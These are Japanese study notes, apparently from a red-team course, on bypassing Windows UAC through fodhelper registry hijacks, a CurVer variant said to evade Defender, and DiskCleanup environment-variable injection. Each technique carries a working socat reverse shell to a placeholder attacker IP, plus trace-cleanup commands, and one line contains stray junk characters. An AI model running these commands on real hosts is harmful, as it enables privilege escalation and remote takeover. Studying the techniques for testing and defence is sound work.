
Windowsホストでユーザーアカウント制御(UAC)をバイパスする一般的な方法
ここで紹介するすべてのシナリオでは、管理者アカウントでサーバーにアクセスできるが、Medium ILコンソールからのみアクセスできると仮定する。

## Intro

- ユーザーアカウントコントロール(UAC)として知られるWindowsシステムで利用可能なセキュリティ機能
- この機能により、実行者（一般ユーザまたは管理者）に関係なく、任意のプロセスを低い権限で実行させるようにできる
  
- 攻撃者の観点からすると、UACをバイパスすることは、高度に制限された環境を抜け出し、ターゲット・ホスト上で完全に特権を昇格させるために不可欠。
- バイパスのテクニックを学ぶと同時に、ターゲット・システム上でトリガーされる可能性のあるアラートと、ブルー・チームが検出する可能性のあるアーティファクトについても調べる。

## User Account Control (UAC)

### UACとは
- ユーザアカウント制御（UAC）は、Windowsのセキュリティ機能であり、==新しいプロセスはデフォルトで非特権アカウントのセキュリティコンテキストで実行される==。
- このポリシーは、管理者自身を含むあらゆるユーザが開始するプロセスに適用される。
- この考え方は、あるアクションが許可されるべきかどうかを判断するのに、ユーザーのIDだけに頼ることはできないということである。 なのでプロセスも見る。
  
- 例えばユーザーBOBがインターネットから悪意のあるアプリケーションを知らずにダウンロードした場合を想像してみる。
- BOBがAdministratorsグループの一員である場合、彼が起動するアプリケーションはそのアクセストークン権限を継承する。そのため、BOB が悪意のあるアプリケーションを起動することを決定し、UAC が無効になっている場合、悪意のあるアプリケーションは即座に管理者権限を獲得することになる。
- 代わりに、UAC が有効になっている場合、悪意のあるアプリケーションは非管理者アクセストークンに制限される。
![ 80](../../../画像ファイル/Pasted%20image%2020230622105852.png)

### UAC Elevation
- 管理者が特権タスクを実行する必要がある場合、UACは特権を昇格させる方法を提供する。
- 昇格は、管理者セキュリティ・コンテキストでアプリケーションを実行することを明示的に承認するかどうかを確認するシンプルなダイアログ・ボックスをユーザーに提示することで機能する：
![ 300](../../../画像ファイル/Pasted%20image%2020230622110316.png)

### Integrity Levels
- UACはMandatory Integrity Control（MIC）であり、ユーザ、プロセス、リソースにそれぞれインテグリティ・レベル（IL）を割り当てることで差別化を図る仕組み。
- 一般的には、ILが高いアクセストークンを持つユーザーやプロセスは、ILが自分より低いか等しいリソースにアクセスできる。
- MICは通常のWindows DACL([用語](../../../Misc/用語.md#ACL,%20DACL,%20ACE,%20ADのオブジェクトについて))よりも優先されるため、DACLに従ってリソースへのアクセスが許可されていても、ILが十分高くなければ意味がない。
  
- 以下の4つのILがWindowsによって使用される：

|Integrity Level|Use|
|---|---|
|Low|一般的にインターネット（Internet Explorerなど）とのやりとりに使用される。パーミッションが非常に制限されている|
|Medium|標準ユーザーおよび管理者のフィルターされたトークンに割り当てられる。|
|High|UACが有効な場合、管理者Elevated Token(権限ユーザが高権限のプロセスをしたい時に使うトークン)で使用される。UAC が無効な場合、すべての管理者は常にhigh IL トークンを使用|
|System|システム用に予約されている|
- プロセスがリソースにアクセスする必要がある場合、呼び出し元のユーザのアクセストークンとそれに関連するILを使用する。プロセスが子をフォークする場合も同様

### Filtered Tokens
- この役割の分離を達成するために、UACはログオン時に一般ユーザと管理者を若干異なる方法で扱う：
	- 非管理者はログイン時に単一のアクセストークンを受け取る。このトークンはMedium ILを持っている
	- 管理者は2つのアクセストークンを受け取る
		- **Filtered Token:**　通常の操作に使用される、管理者権限を取り除いたトークン。このトークンはMedium ILを持っている
		- **Elevated Token**: 管理者権限で何かを実行する必要がある場合に使用する。このトークンはHigh ILを持っている

- このようにして、管理者は、UAC経由で明示的に管理者権限を要求しない限り、フィルタリングされたトークンを使用することになる

### 通常の方法でアプリケーションを開く
- 通常のcmdを開こうとする場合、非特権ユーザーとして開くか、管理者として開くかのどちらかを選択できる。その選択によって、MediumかHighのどちらかの整合性レベルのトークンが、生成されたプロセスに割り当てられる：
![](../../../画像ファイル/Pasted%20image%2020230622112253.png)
- Process Hackerを使って両方のプロセスを分析すると、関連するトークンとその違いを見ることができる：
![](../../../画像ファイル/Pasted%20image%2020230622113032.png)
- 左側は、フィルタリングされたトークンで、ILはMedium、特権はほとんど割り当てられていない。
- 右側では、Elavated: Yesとなっていて、このプロセスはILがHighで実行され、より多くの特権が使用可能であることがわかる。
- もう1つの違いは、ILがMediumのプロセスは、Administratorsグループの一員であることに関連する特権を事実上拒否されていること。

### UAC Settings
- セキュリティ要件に応じて、UACは4つの異なる通知レベルで実行するように設定できる：
	- *Always notify*　:　Windowsの設定を変更したり、プログラムがアプリケーションをインストールしたり、コンピュータに変更を加えようとしたときに、ユーザに通知し、承認を求める。
	- *Notify me only when programs try to make changes to my computer*　: プログラムがアプリケーションをインストールしようとしたり、コンピュータに変更を加えようとしたときに、ユーザに通知し、承認を求める。管理者には、Windowsの設定を変更するときにプロンプトが表示されない。
	- *Notify me only when programs try to make changes to my computer (do not dim my desktop)*　: 上記と同じだが、安全なデスクトップではUACプロンプトが表示されない。
	- *Never notify*　:UACプロンプトを無効にする。管理者は高い特権トークンを使用してすべてを実行
- デフォルトでは、UACは*Notify me only when programs try to make changes to my computer* レベルになっている
![ 400](../../../画像ファイル/Pasted%20image%2020230622113704.png)
- 攻撃者の観点からは、下位の 3 つのセキュリティレベルは同等であり、*Always notify*設定にのみに注目してる。

### UAC Internals
- UACの中核には、**Application Information Service**（Appinfo）がある。ユーザーが昇格を要求するたびに、次のような処理が行われる：
	1. ユーザーは、管理者としてアプリケーションを実行するよう要求する。  
	2. *runas* 動詞を使用して *ShellExecute API* が呼び出される。  
	3. このリクエストは、昇格を処理するために Appinfo に転送される。  
	4. アプリケーションのマニフェストがチェックされ、AutoElevationが許可されているかどうかが確認される（これについては後で詳しく説明する）。  
	5. Appinfo は consent.exe を実行し、UAC プロンプトをSecure Desktopに表示する。Secure Desktopとは、実際のユーザのデスクトップで実行されているものからプロセスを分離し、他のプロセスがUACプロンプトを何らかの方法で改ざんするのを避けるための別のデスクトップのこと。(要は、Secure Desktop上にUACプロンプトが表示されると、領域外をクリックしても「プルンッ!」てなって受け付けないやつ。)
	6. ユーザがアプリケーションを管理者として実行することに同意すると、Appinfo サービスはユーザの Elevated Token を使用して要求を実行する。その後、Appinfoは新しいプロセスの親プロセスIDを、UACプロンプトを表示していたシェルプロセスのIDに設定する。これにより、新しいプロセスは適切なセキュリティコンテキストや権限を継承し、UACプロンプトを起動したシェルプロセスとの関連性を持つことができる)
![](../../../画像ファイル/Pasted%20image%2020230622115156.png)

### Bypassing UAC
- 攻撃者の視点から見ると、Powershellやcmd.exe経由でWindowsホストへのリモートシェルを取得する状況を考える。
- Administratorsグループに属するアカウントでアクセスできるかもしれないが、将来のアクセスのためにバックドア・ユーザーを作成しようとすると、次のようなエラーが発生する：
![ 300](../../../画像ファイル/Pasted%20image%2020230622115546.png)
- 割り当てられたグループをチェックすることで、Mandatory Label\\Medium Mandatory LeveからセッションがMedium ILで実行されているこ とを確認できる：
![](../../../画像ファイル/Pasted%20image%2020230622115617.png)
- つまり、ターゲットを完全に制御したいのであれば、UACをバイパスしなければならない。    
- おもしろいことにUACプロンプトは、マルウェアや攻撃者の実行を妨げるというよりも、高い権限で実行されていることをユーザーに思い出させるものとして使われている。そのため、UACプロンプトはセキュリティのためではなく、Microsoftにとってはどのような迂回テクニックも脆弱性とはみなされず、そのため現在でもパッチが適用されていないものがある。  

- ほとんどのバイパステクニックは、==High ILプロセスを活用して代わりに何かを実行できるかどうかに依存している==。High ILの親プロセスによって作成されたプロセスは同じ整合性レベルを継承するため、UACプロンプトを通過しなくても、昇格トークンを取得するのに十分。

## UAC: Auto-Elevating Processes

### AutoElevate
- 前述したように、一部の実行可能ファイルは自動昇格し、ユーザの介入なしにHigh ILを達成することができる。これはコントロールパネルのほとんどの機能と、Windowsに付属しているいくつかの実行ファイルに当てはまる。  
  
#### アプリケーションを自動昇格させる要件
- 実行ファイルがWindows Publisherによって署名されている
- 実行ファイルは、信頼できるディレクトリに含まれていなければならない。例えば、`%SystemRoot%/System32/`や`%ProgramFiles%/`

#### アプリケーションの種類によっては、追加の要件：
- 実行可能ファイル (.exe) は、マニフェスト([用語](../../../Misc/用語.md#manifest))内で autoElevate 要素を宣言する必要がある。ファイルのマニフェストをチェックするには、Sysinternals スイートの一部として提供されているツールである[sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)を使用。msconfig.exe のマニフェストをチェックすると、autoElevate プロパティが見つかる：
- ![](../../../画像ファイル/Pasted%20image%2020230622154948.png)
- mmc.exeは、ユーザーが要求する.mscスナップインによって自動昇格する。Windows に含まれるほとんどの .msc ファイルは自動昇格する 
- Windows では、マニフェストで要求されていない場合でも自動昇格する実行可能ファイルの追加リストを保持している。このリストには、たとえば pkgmgr.exe や spinstall.exe が含まれる
- COMオブジェクト([用語](../../../Misc/用語.md#COM))は、いくつかのレジストリキーを設定することによって、自動昇降を要求できる(https://learn.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)

### Case study: Fodhelper
- Fodhelper.exeは、追加言語、デフォルトではインストールされないアプリケーション、またはその他のOSの特性などのWindowsのオプション機能を管理するWindowsデフォルトの実行可能ファイルの1つ。
- システム・コンフィギュレーションに使われるほとんどのプログラムと同様に、fodhelperはデフォルトのUAC設定を使用する際に自動昇格することができ、管理者が標準的な管理タスクを実行する際に昇格を要求されないようにすることができる。
- 自動昇格実行ファイルについてはすでに見てきたが、msconfigとは異なり、fodhelperはGUIにアクセスしなくても悪用できる。
![ 300](../../../画像ファイル/Pasted%20image%2020230622160206.png)
- 攻撃者の観点からすると、これはMedium ILを持つリモート・シェルを使って、完全に機能するHigh ILを持つプロセスに活用できることを意味する。
- fodhelperは、レジストリを検索して目的の特定のキーを探す
![](../../../画像ファイル/Pasted%20image%2020230622171543.png)
- Windowsはファイルを開くとき、レジストリをチェックして、どのアプリケーションを使うかを知る。
- レジストリはファイルタイプごとにProgrammatic ID（ProgID）と呼ばれるキーを保持しており、対応するアプリケーションが関連付けられている。
- 例えば、HTMLファイルを開こうとしたとき、HKEY_CLASSES_ROOTとして知られるレジストリの一部がチェックされ、システムは、それを開くためにお好みのWebクライアントを使用する必要がある。
- 使用するコマンドは、各ファイルのProgIDの`shell/open/command`サブキーの下で指定される。
- htmlfile "のProgIDを例にとって説明する：
![](../../../画像ファイル/Pasted%20image%2020230622171827.png)

- 実際には、HKEY_CLASSES_ROOTはレジストリ上の2つの異なるパスをマージしたビューに過ぎない：

|Path|Description|
|---|---|
|HKEY_LOCAL_MACHINE\Software\Classes|システム全体のファイル関連付け|
|HKEY_CURRENT_USER\Software\Classes|アクティブユーザーのファイル関連付け|

- HKEY_CLASSES_ROOTを確認するときに、HKEY_CURRENT_USER（HKCU）にユーザー固有の関連付けがある場合は、そちらが優先される。
- ユーザー固有の関連付けが設定されていない場合は、HKEY_LOCAL_MACHINE（HKLM）にあるシステム全体の関連付けが代わりに使用される。 ^75f081
- この方法で、各ユーザは必要に応じて、好みのアプリケーションを個別に選択できる。  
  
- fodhelperに戻ると、Procmonの"PATH"からわかるように、ms-settings ProgIDでファイルを開こうとしている。
- このProgIDの関連付けをHKCUの現在のユーザーコンテキストに作成することで、デフォルトのシステム全体の関連付けを上書きし、どのコマンドでファイルを開くかを制御することができる。fodhelperはautoElevate実行可能ファイルなので、fodhelperが生成するサブプロセスはすべてHigh ILトークンを継承し、効果的にUACをバイパスする。

#### Fodhelper UAC Bypass 実践例
- ターゲットサーバーにバックドアを仕掛けた。管理者グループ内にアカウントを作成することに成功したが、UACが特権タスクの実行を妨げているという状態。
- UACをバイパスし、完全に機能するHigh ILシェルを取得する
  
0. まずバックドアに接続する
```zsh
nc [IP] [PORT]
```
1. 接続が完了したら、ユーザーがAdministratorsグループに属しているかどうかをチェックする
```powershell
whoami
net user [whoami result] | find "Local Group"
```
- `whoami`の結果が`myserver\attacker`のような場合、`[whoami result]`には`attacker`を入れる

2. Medium ILトークンで実行されているかチェック
```powershell
whoami /groups | find "Label"
```

3. ms-settingsクラスをリバースシェルに関連付けるために必要なレジストリ値を設定する。(便宜上、socatのコピーは`c:\tools\socat\`にある)。以下のコマンドを使用して、標準のコマンドラインから必要なレジストリ・キーを設定する：
```powershell
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:[AttackerIP]:[PORT] EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
```
- `/v`: 新しい値の名前を作成
- `/d`: そこに追加する
- `/f`: 強制的に
- 3行目のコマンドで、もともと値の入っていた"DelegateExecute"の値を空にした。これはクラスの関連付けを有効にするため
![ 400](../../../画像ファイル/Pasted%20image%2020230622184101.png)
- 4行目のコマンドで、(Default)にコマンドを設定した。
 ![ 300](../../../画像ファイル/Pasted%20image%2020230622191602.png)
- このレジストリ値が存在しない場合、OSはコマンドを無視し、代わりにシステム全体のクラス関連付けられたコマンドを使用する。  [8. Bypassing UAC](#^75f081)
  
4. マシンのnetcatを使ってリスナーをセットアップしてfodhelperを実行：
```zsh
nc -lvnp [PORT]
```
```powershell
fodhelper.exe
```

### 痕跡の消去
- このエクスプロイトを実行した結果、ターゲット・システム上にレジストリ・キーの形でいくつかのアーティファクトが作成された。検出されないようにするには、以下のコマンドで後始末をする必要がある：
```powershell
reg delete HKCU\Software\Classes\ms-settings\ /f
```

## UAC：Windows DefenderをバイパスするFodhelperエクスプロイトの改良

### Windows Defender
- もしWindows Defenderが有効になっていたら。
- 上の節と同じように、`reg add %REG_KEY% /d %CMD% /f`で`(Default)`にコマンドを挿入するとWinDefenderが検知してしまう。
- 検知するまで1秒くらいかかるので、それでリバースシェル確立も可能だが信頼性と実現性が低い

### fodhelper exploitの改良
###### 基本
- ペイロードを`HKCU\Software\Classes\ms-settings\Shell\Open\command`コマンドに書き込む代わりに、progIDレジストリキーの下にある`CurVer`エントリを使用する。
- このエントリは、異なるバージョンのアプリケーションの複数のインスタンスが同じシステム上で動作している場合に使用される。
- `CurVer`を使用すると、指定したファイルタイプを開くときにWindowsが使用するアプリケーションのデフォルトバージョンを指定できる。

- そのために、レジストリに新しいprogIDのエントリを作成し（どんな名前でもOK）、`ms-settings` progIDの`CurVer`エントリを新しく作成したprogIDに指定する。
- こうすることで、`fodhelper`が`ms-settings` progIDを使ってファイルを開こうとしたときに、`CurVer`エントリーが新しく作成したprogIDを指していることに気づき、それを確認して使用するコマンドを決定する。

#### 実践
1. リスナーをセットアップ
```zsh
nc -lvnp 1234
```

2. Powershellのコマンドレットを使用しないようにエクスプロイトを少し改変して実行
```powershell
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:[Attacker_ip]:[PORT] EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```

##### コマンドの解説
- [@V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)は、この目的を達成するためにPowershellを使用している。
- 以下は、Socatリバースシェルを使用するように修正したバージョン。これを実行すると検知されてしまう。なぜなら、AVによっては公開されたエクスプロイトをDBに登録しているから。
```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:[AttackerIP]:[PORT] EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

fodhelper.exe
```
- このエクスプロイトは、.pwnという名前の新しいProgIDのエントリを作成し、ペイロードをそのようなファイルを開くときに使用するコマンドに関連付ける。
- そして、ms-settingsのCurVerエントリが.pwn progIDを指すようにする。
- fodhelperがms-settingsプログラムを開こうとすると、代わりに.pwn progIDが指定され、関連付けられたコマンドが使われる。    
- ペイロードを入れるprogIDの名前は完全に任意なので、このテクニックはWindows Defenderを回避する可能性が高い。

### 痕跡の消去
```powershell
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

## UAC: Environment Variable Expansion

### Bypassing Always Notify
[8. Bypassing UAC](#UAC%20Settings)

- UACの設定がAlways Notifyの場合、先ほどまでのエクスプロイトは設定の変更にあたり、UACプロンプトが表示されてしまうので使えない。
- ==Scheduled Tasksを悪用する==。
- 設計上、SchtasksはUACセキュリティレベルとは無関係でユーザーの操作なしに実行されるので、UACプロンプトを表示しない。
- 昇格させるためのSchtasksは、UACプロンプトを通さずに自動的に昇格する。

### Case study: Disk Cleanup Scheduled Task
- なぜ、Disk Cleanup Schtaskを選択するのか理解するために、Task Schedulerを開き、タスクの設定を確認する
![](../../../画像ファイル/Pasted%20image%2020230622200532.png)
- ここでは、タスクがUsersアカウントで実行されるように設定されており、呼び出しユーザーから特権を継承することがわかる。
- "Run with highest privileges"オプションは、呼び出されたユーザが利用できる最高権限のセキュリティトークンを使う。管理者でない==通常のユーザがこのタスクを呼び出すと==、管理者でないユーザーが利用できる最高の特権トークンであるため、==Medium ILのみで実行され、バイパスは機能しない==ことに注意する。

- Actions と Settingsタブを確認すると、以下のようになっている：
![](../../../画像ファイル/Pasted%20image%2020230622200856.png)
- つまり、このタスクはon demandで実行することができ、呼び出されると以下のコマンドを実行する
- `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`
- このコマンドは環境変数に依存しているので、環境変数を通してコマンドを注入し、DiskCleanupタスクを手動で起動して実行させることができるかもしれない。
- `HKCU\Environment`にエントリーを作成することで、レジストリを通して`%windir%`変数を上書きすることができる。socatを使ってリバースシェルを実行したい場合は、次のように`%windir%`を設定する（引用符は使わない）：
```
"cmd.exe /c C:\tools\socat\socat.exe TCP:[AttackerIP]:[PORT] EXEC:cmd.exe,pipes &REM"
```
- コマンドの最後に、"&REM"（空白で終わる）を、環境変数を展開する際に`%windir%`の後に置かれるコメントと連結して、DiskCleanupが使用する最終コマンドを取得する。その結果、コマンドは次のようになるbvsfsghsfjagnabvabn zzzzzzzz
```
cmd.exe /c C:\tools\socat\socat.exe TCP:[AttackerIP]:[PORT] EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```
- "REM"以降はコメントとして無視される。

### 実践
1. リスナーをセットアップ

2. バックドアなど経由してターゲットマシンに接続する

```powershell
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

